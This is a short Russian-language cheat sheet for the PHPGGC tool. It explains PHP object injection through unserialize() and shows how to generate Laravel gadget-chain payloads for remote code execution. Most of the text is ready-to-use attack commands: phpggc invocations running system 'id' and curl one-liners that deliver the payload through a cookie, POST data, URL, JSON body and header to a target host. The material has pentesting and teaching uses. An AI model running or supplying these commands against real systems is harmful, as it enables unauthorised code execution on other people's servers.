## 📦 PHPGGC: ШПАРГАЛКА

### 🎯 ЧТО ДЕЛАЕТ?
Генерирует сериализованные payload'ы для эксплуатации PHP object injection (unserialize) уязвимостей.

### 🔥 КАКУЮ УЯЗВИМОСТЬ ЭКСПЛУАТИРУЕТ?
PHP Object Injection — когда приложение вызывает unserialize() на пользовательских данных. PHPGGC создает цепочку объектов, которые при десериализации дают RCE.

📌 ГЛАВНОЕ
Приложение должно иметь unserialize() на входящих данных, а версия фреймворка — соответствовать гаджету.

### 💥 ПРИМЕР (Laravel RCE)

# Показать все гаджеты Laravel
phpggc -l Laravel

# Сгенерировать payload (RCE через system)
phpggc Laravel/RCE3 system 'id'

# Base64 вариант (для URL/куки)
phpggc -b Laravel/RCE3 system 'id'


КУДА ВСТАВЛЯТЬ ПЕЙЛОД?

# В куке (session)
curl -b "session=$(phpggc -b Laravel/RCE3 system id)" http://target.com

# В POST параметре
curl -X POST -d "data=$(phpggc -b Laravel/RCE3 system id)" http://target.com

# В URL (GET)
curl "http://target.com/?page=$(phpggc -b Laravel/RCE3 system id | urlencode)"

# В JSON
curl -X POST -H "Content-Type: application/json" -d "{\"token\": \"$(phpggc -b Laravel/RCE3 system id)\"}" http://target.com

# В заголовке
curl -H "X-Auth: $(phpggc -b Laravel/RCE3 system id)" http://target.com